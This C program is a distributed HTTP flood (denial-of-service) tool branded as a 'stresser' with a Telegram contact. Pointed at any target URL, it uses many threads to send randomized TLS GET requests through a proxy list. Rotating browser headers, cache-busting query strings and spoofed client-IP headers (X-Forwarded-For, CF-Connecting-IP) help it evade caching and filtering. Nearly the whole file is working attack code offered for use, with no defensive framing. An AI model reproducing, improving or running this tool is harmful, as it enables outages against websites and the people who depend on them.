#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// ========== WARNA ==========
#define BLUE "\033[34m"
#define WHITE "\033[37m"
#define RESET "\033[0m"
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define CYAN "\033[36m"
#define MAGENTA "\033[35m"

// ========== GLOBAL ==========
int running = 1;
long long requestCount = 0;
char targetHost[256];
char targetPath[256] = "/";
int targetPort = 443;
int attackTime = 60;
int ratePerSecond = 10;
int threadCount = 10;
char** proxies;
int proxyCount = 0;
pthread_mutex_t countMutex = PTHREAD_MUTEX_INITIALIZER;

// ========== RANDOM ==========
char* ip_spoof() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d",
             rand() % 255, rand() % 255, rand() % 255, rand() % 255);
    return ip;
}

char* randstr(int length) {
    static char result[64];
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < length && i < 63; i++) {
        result[i] = chars[rand() % (sizeof(chars) - 1)];
    }
    result[length < 63 ? length : 63] = '\0';
    return result;
}

char* generateRandomString(int minLen, int maxLen) {
    int len = minLen + (rand() % (maxLen - minLen + 1));
    return randstr(len);
}

char* randomElement(char** arr, int size) {
    return arr[rand() % size];
}

// ========== HEADER POOLS ==========
char* accept_header[] = {
    "*/*", "image/*", "image/webp,image/apng", "text/html",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
};
int accept_count = sizeof(accept_header) / sizeof(accept_header[0]);

char* encoding_header[] = {"*", "*/*", "gzip", "gzip, deflate, br", "gzip, deflate", "gzip, deflate, br, zstd"};
int encoding_count = sizeof(encoding_header) / sizeof(encoding_header[0]);

char* cache_header[] = {
    "max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0",
    "must-revalidate", "proxy-revalidate", "s-maxage=604800",
    "no-cache, private", "max-age=300, must-revalidate",
    "no-store, max-age=0, private, must-revalidate",
    "public, max-age=10, s-maxage=10",
    "no-cache, no-store,private, max-age=0, must-revalidate",
    "no-cache, no-store,private, s-maxage=604800, must-revalidate",
    "no-cache, no-store,private, max-age=604800, must-revalidate"
};
int cache_count = sizeof(cache_header) / sizeof(cache_header[0]);

char* refers[] = {
    "https://google.com", "https://check-host.net/", "https://www.facebook.com/",
    "https://www.youtube.com/", "https://www.fbi.com/", "https://discord.com",
    "https://www.cloudflare.com"
};
int refers_count = sizeof(refers) / sizeof(refers[0]);

char* uap[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"
};
int uap_count = sizeof(uap) / sizeof(uap[0]);

char* language_header[] = {
    "id-ID,id;q=0.9,en;q=0.8", "en-US,en;q=0.9,id;q=0.8",
    "en-GB,en;q=0.9", "ja-JP,ja;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8"
};
int language_count = sizeof(language_header) / sizeof(language_header[0]);

char* fetch_site[] = {"same-origin", "same-site", "cross-site", "none"};
int fetch_site_count = sizeof(fetch_site) / sizeof(fetch_site[0]);

char* fetch_mode[] = {"navigate", "same-origin", "no-cors", "cors"};
int fetch_mode_count = sizeof(fetch_mode) / sizeof(fetch_mode[0]);

char* fetch_dest[] = {"document", "sharedworker", "subresource", "unknown", "worker"};
int fetch_dest_count = sizeof(fetch_dest) / sizeof(fetch_dest[0]);

char* sec_ch_ua[] = {
    "\"Google Chrome\";v=\"133\", \"Chromium\";v=\"133\", \"Not_A Brand\";v=\"24\"",
    "\"Google Chrome\";v=\"132\", \"Chromium\";v=\"132\", \"Not_A Brand\";v=\"24\"",
    "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
    "\"Microsoft Edge\";v=\"133\", \"Chromium\";v=\"133\", \"Not_A Brand\";v=\"24\"",
    "\"Brave\";v=\"133\", \"Chromium\";v=\"133\", \"Not_A Brand\";v=\"24\""
};
int sec_ch_ua_count = sizeof(sec_ch_ua) / sizeof(sec_ch_ua[0]);

char* sec_ch_ua_platform[] = {"\"Windows\"", "\"macOS\"", "\"Linux\"", "\"Android\"", "\"iOS\""};
int sec_ch_ua_platform_count = sizeof(sec_ch_ua_platform) / sizeof(sec_ch_ua_platform[0]);

char* sec_ch_ua_mobile[] = {"?0", "?1", "?0"};
int sec_ch_ua_mobile_count = sizeof(sec_ch_ua_mobile) / sizeof(sec_ch_ua_mobile[0]);

// ========== BUILD HEADERS ==========
void buildHeaders(char* buffer, int bufsize) {
    char path[256];
    snprintf(path, sizeof(path), "%s?%s=%s&%s=%s",
             targetPath,
             randstr(6), generateRandomString(20, 30),
             randstr(4), generateRandomString(15, 25));
    
    snprintf(buffer, bufsize,
             "GET %s HTTP/2\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept: %s\r\n"
             "Accept-Encoding: %s\r\n"
             "Accept-Language: %s\r\n"
             "Cache-Control: %s\r\n"
             "Referer: %s\r\n"
             "Sec-Fetch-Mode: %s\r\n"
             "Sec-Fetch-Site: %s\r\n"
             "Sec-Fetch-Dest: %s\r\n"
             "Sec-Ch-Ua: %s\r\n"
             "Sec-Ch-Ua-Platform: %s\r\n"
             "Sec-Ch-Ua-Mobile: %s\r\n"
             "X-Forwarded-For: %s\r\n"
             "X-Real-IP: %s\r\n"
             "X-Client-IP: %s\r\n"
             "CF-Connecting-IP: %s\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Pragma: no-cache\r\n"
             "Upgrade-Insecure-Requests: 1\r\n"
             "Connection: keep-alive\r\n"
             "\r\n",
             path,
             targetHost,
             randomElement(uap, uap_count),
             randomElement(accept_header, accept_count),
             randomElement(encoding_header, encoding_count),
             randomElement(language_header, language_count),
             randomElement(cache_header, cache_count),
             randomElement(refers, refers_count),
             randomElement(fetch_mode, fetch_mode_count),
             randomElement(fetch_site, fetch_site_count),
             randomElement(fetch_dest, fetch_dest_count),
             randomElement(sec_ch_ua, sec_ch_ua_count),
             randomElement(sec_ch_ua_platform, sec_ch_ua_platform_count),
             randomElement(sec_ch_ua_mobile, sec_ch_ua_mobile_count),
             ip_spoof(), ip_spoof(), ip_spoof(), ip_spoof()
    );
}

// ========== READ PROXY FILE ==========
char** readLines(const char* filePath, int* count) {
    FILE* file = fopen(filePath, "r");
    if (!file) return NULL;
    
    char** lines = NULL;
    *count = 0;
    char line[256];
    
    while (fgets(line, sizeof(line), file)) {
        if (line[0] == '#' || line[0] == '\n') continue;
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) == 0) continue;
        
        lines = realloc(lines, sizeof(char*) * (*count + 1));
        lines[*count] = strdup(line);
        (*count)++;
    }
    
    fclose(file);
    return lines;
}

// ========== PARSE URL ==========
int parseURL(const char* url) {
    char temp[512];
    strcpy(temp, url);
    
    char* httpsPos = strstr(temp, "https://");
    if (httpsPos) {
        memmove(temp, httpsPos + 8, strlen(httpsPos + 8) + 1);
    } else {
        char* httpPos = strstr(temp, "http://");
        if (httpPos) {
            memmove(temp, httpPos + 7, strlen(httpPos + 7) + 1);
        }
    }
    
    char* pathPos = strchr(temp, '/');
    if (pathPos) {
        strncpy(targetHost, temp, pathPos - temp);
        targetHost[pathPos - temp] = '\0';
        strcpy(targetPath, pathPos);
    } else {
        strcpy(targetHost, temp);
        strcpy(targetPath, "/");
    }
    
    char* portPos = strchr(targetHost, ':');
    if (portPos) {
        targetPort = atoi(portPos + 1);
        *portPos = '\0';
    } else {
        targetPort = 443;
    }
    
    return 1;
}

// ========== FLOOD WORKER ==========
void* floodWorker(void* arg) {
    int id = *(int*)arg;
    free(arg);
    
    while (running) {
        if (proxyCount == 0) {
            usleep(100000);
            continue;
        }
        
        char* proxyAddr = proxies[rand() % proxyCount];
        char* colonPos = strchr(proxyAddr, ':');
        if (!colonPos) continue;
        
        char proxyHost[256];
        strncpy(proxyHost, proxyAddr, colonPos - proxyAddr);
        proxyHost[colonPos - proxyAddr] = '\0';
        int proxyPort = atoi(colonPos + 1);
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in proxyAddrStruct;
        proxyAddrStruct.sin_family = AF_INET;
        proxyAddrStruct.sin_port = htons(proxyPort);
        
        struct hostent* proxyHostent = gethostbyname(proxyHost);
        if (!proxyHostent) { close(sock); continue; }
        proxyAddrStruct.sin_addr = *((struct in_addr*)proxyHostent->h_addr);
        
        if (connect(sock, (struct sockaddr*)&proxyAddrStruct, sizeof(proxyAddrStruct)) < 0) {
            close(sock);
            continue;
        }
        
        char connectReq[512];
        snprintf(connectReq, sizeof(connectReq),
                 "CONNECT %s:%d HTTP/1.1\r\n"
                 "Host: %s:%d\r\n"
                 "User-Agent: %s\r\n"
                 "Proxy-Connection: Keep-Alive\r\n\r\n",
                 targetHost, targetPort, targetHost, targetPort,
                 randomElement(uap, uap_count));
        
        if (send(sock, connectReq, strlen(connectReq), 0) <= 0) {
            close(sock);
            continue;
        }
        
        char buffer[1024];
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) { close(sock); continue; }
        buffer[bytes] = '\0';
        
        if (!strstr(buffer, "200")) { close(sock); continue; }
        
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) { close(sock); continue; }
        
        SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
        SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
        SSL_CTX_set_cipher_list(ctx, "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305");
        
        SSL* ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_set_tlsext_host_name(ssl, targetHost);
        
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
            continue;
        }
        
        for (int i = 0; i < ratePerSecond && running; i++) {
            char headers[4096];
            buildHeaders(headers, sizeof(headers));
            if (SSL_write(ssl, headers, strlen(headers)) <= 0) break;
            pthread_mutex_lock(&countMutex);
            requestCount++;
            pthread_mutex_unlock(&countMutex);
        }
        
        SSL_shutdown(ssl);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sock);
    }
    return NULL;
}

// ========== BANNER ==========
void showBanner() {
    printf(CYAN "--------------------------------------------\n" RESET);
    printf(YELLOW "User: " GREEN "Prv" RESET " " CYAN "|" RESET " " YELLOW "Vip: " GREEN "true" RESET " " CYAN "|" RESET " " YELLOW "SuperVip: " GREEN "true\n" RESET);
    printf(YELLOW "Admin: " MAGENTA "ZYNOS" RESET " " CYAN "|" RESET " " YELLOW "Expired: " RED "No" RESET " " CYAN "|" RESET " " YELLOW "Time Limit: " GREEN "%ds\n" RESET, attackTime);
    printf(CYAN "--------------------------------------------\n" RESET);
    printf(YELLOW "Target: " WHITE "%s\n" RESET, targetHost);
    printf(YELLOW "Rate: " WHITE "%d/s" RESET " " CYAN "|" RESET " " YELLOW "Threads: " WHITE "%d\n" RESET, ratePerSecond, threadCount);
    printf(YELLOW "Proxy: " WHITE "proxy.txt (" GREEN "%d" WHITE ")\n" RESET, proxyCount);
    printf(CYAN "--------------------------------------------\n" RESET);
    printf(MAGENTA "Zynos Stresser 2025-2026 | C | t.me/zynos_official\n" RESET);
    printf(CYAN "--------------------------------------------\n" RESET);
}

// ========== MAIN ==========
int main(int argc, char* argv[]) {
    if (argc < 6) {
        printf("Usage: %s <target> <time> <rate> <threads> <proxy.txt>\n", argv[0]);
        printf("Example: %s https://target.com 60 10 100 proxy.txt\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    
    parseURL(argv[1]);
    attackTime = atoi(argv[2]);
    ratePerSecond = atoi(argv[3]);
    threadCount = atoi(argv[4]);
    char* proxyFile = argv[5];
    
    proxies = readLines(proxyFile, &proxyCount);
    if (proxyCount == 0) {
        printf("No proxies found!\n");
        return 1;
    }
    
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    
    showBanner();
    
    pthread_t* threads = malloc(sizeof(pthread_t) * threadCount);
    for (int i = 0; i < threadCount; i++) {
        int* id = malloc(sizeof(int));
        *id = i;
        pthread_create(&threads[i], NULL, floodWorker, id);
    }
    
    sleep(attackTime);
    running = 0;
    
    for (int i = 0; i < threadCount; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf(GREEN "\n[+] Attack finished! Total requests: %lld\n" RESET, requestCount);
    
    free(threads);
    for (int i = 0; i < proxyCount; i++) free(proxies[i]);
    free(proxies);
    
    return 0;
}